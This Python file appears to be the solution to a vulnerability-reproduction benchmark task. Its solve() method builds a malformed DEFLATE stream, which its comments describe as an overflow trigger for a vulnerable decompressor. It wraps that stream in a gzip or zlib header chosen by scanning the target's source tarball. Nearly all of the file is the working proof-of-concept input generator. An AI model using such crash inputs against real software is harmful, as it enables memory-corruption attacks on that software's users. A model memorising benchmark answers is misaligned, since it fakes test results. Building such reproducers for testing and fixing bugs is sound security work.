import io
import os
import tarfile
from typing import Optional


class _BitWriterLSB:
    __slots__ = ("_buf", "_bitbuf", "_bitcount")

    def __init__(self):
        self._buf = bytearray()
        self._bitbuf = 0
        self._bitcount = 0

    def add_bits(self, value: int, nbits: int) -> None:
        if nbits <= 0:
            return
        value &= (1 << nbits) - 1
        self._bitbuf |= value << self._bitcount
        self._bitcount += nbits
        while self._bitcount >= 8:
            self._buf.append(self._bitbuf & 0xFF)
            self._bitbuf >>= 8
            self._bitcount -= 8

    def finish(self) -> bytes:
        if self._bitcount:
            self._buf.append(self._bitbuf & 0xFF)
            self._bitbuf = 0
            self._bitcount = 0
        return bytes(self._buf)


def _build_deflate_poc() -> bytes:
    bw = _BitWriterLSB()

    # Block 1: fixed Huffman, empty, not final
    bw.add_bits(0, 1)  # BFINAL=0
    bw.add_bits(1, 2)  # BTYPE=01 (fixed)
    bw.add_bits(0, 7)  # EOB (256) in fixed Huffman is 7 zero bits

    # Block 2: dynamic Huffman, final, minimal valid stream, with HCLEN=15 (reads 19 code-length lengths)
    bw.add_bits(1, 1)  # BFINAL=1
    bw.add_bits(2, 2)  # BTYPE=10 (dynamic)

    hlit = 0   # 257 literal/length codes
    hdist = 1  # 2 distance codes
    hclen = 15 # 19 code-length codes (overflow trigger in vulnerable code)

    bw.add_bits(hlit, 5)
    bw.add_bits(hdist, 5)
    bw.add_bits(hclen, 4)

    # Code length code lengths in deflate order:
    # [16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15]
    # We set only symbol 1 and 18 to length 1; others 0.
    clen = [0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0]
    for v in clen:
        bw.add_bits(v, 3)

    # With only symbols {1,18} present at length 1:
    # canonical codes (length=1): sym 1 -> 0, sym 18 -> 1
    # Encode HLIT+HDIST lengths (257+2=259):
    # litlen: sym0 len1, sym1..255 len0 (255 zeros), sym256 len1
    # dist: sym0 len1, sym1 len1
    # Code-length stream: 1, 18(138 zeros), 18(117 zeros), 1, 1, 1
    bw.add_bits(0, 1)      # symbol 1 (len=1)
    bw.add_bits(1, 1)      # symbol 18
    bw.add_bits(127, 7)    # repeat 0 for 11+127=138
    bw.add_bits(1, 1)      # symbol 18
    bw.add_bits(106, 7)    # repeat 0 for 11+106=117
    bw.add_bits(0, 1)      # symbol 1 (len=1) for EOB (256)
    bw.add_bits(0, 1)      # symbol 1 (len=1) for dist0
    bw.add_bits(0, 1)      # symbol 1 (len=1) for dist1

    # Data: EOB using litlen tree with two len=1 codes (sym0 and sym256):
    # sym0 -> 0, sym256 -> 1
    bw.add_bits(1, 1)

    return bw.finish()


def _wrap_gzip(deflate_data: bytes) -> bytes:
    # Minimal gzip header (no optional fields)
    hdr = bytearray()
    hdr += b"\x1f\x8b"  # ID1 ID2
    hdr += b"\x08"      # CM=deflate
    hdr += b"\x00"      # FLG
    hdr += b"\x00\x00\x00\x00"  # MTIME
    hdr += b"\x00"      # XFL
    hdr += b"\x03"      # OS=Unix
    # CRC32 and ISIZE for empty output
    footer = b"\x00\x00\x00\x00\x00\x00\x00\x00"
    return bytes(hdr) + deflate_data + footer


def _wrap_zlib(deflate_data: bytes) -> bytes:
    # zlib header: CMF=0x78 (deflate, 32K), FLG=0x01 (check bits ok, no dict)
    # Adler32 for empty output is 1
    return b"\x78\x01" + deflate_data + b"\x00\x00\x00\x01"


def _detect_wrapper(src_path: str) -> str:
    gzip_score = 0
    zlib_score = 0

    def add_scores(text: str) -> None:
        nonlocal gzip_score, zlib_score
        t = text.lower()
        gzip_score += 3 * t.count("gzip")
        gzip_score += 2 * t.count("crc32")
        gzip_score += 2 * t.count("isize")
        gzip_score += t.count(".gz")
        if "0x1f" in t and "0x8b" in t:
            gzip_score += 6
        if "1f8b" in t or "8b1f" in t:
            gzip_score += 6
        if "gunzip" in t:
            gzip_score += 6

        zlib_score += 3 * t.count("zlib")
        zlib_score += 3 * t.count("adler")
        zlib_score += t.count("cmf")
        zlib_score += t.count("flg")
        zlib_score += t.count("fdict")
        if "0x78" in t:
            zlib_score += 1

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf:
                if not m.isfile():
                    continue
                name = m.name.lower()
                if not (name.endswith((".c", ".h", ".cc", ".cpp", ".hpp", ".md", ".txt")) or name.endswith("makefile")):
                    continue
                if m.size <= 0:
                    continue
                if m.size > 400_000:
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read(220_000)
                if not data:
                    continue
                add_scores(data.decode("latin1", errors="ignore"))
                if gzip_score - zlib_score >= 25:
                    return "gzip"
                if zlib_score - gzip_score >= 25:
                    return "zlib"
    except Exception:
        pass

    if gzip_score > zlib_score and gzip_score > 0:
        return "gzip"
    if zlib_score > 0:
        return "zlib"
    return "raw"


class Solution:
    def solve(self, src_path: str) -> bytes:
        deflate_data = _build_deflate_poc()
        wrapper = _detect_wrapper(src_path)
        if wrapper == "zlib":
            return _wrap_zlib(deflate_data)
        if wrapper == "raw":
            return deflate_data
        return _wrap_gzip(deflate_data)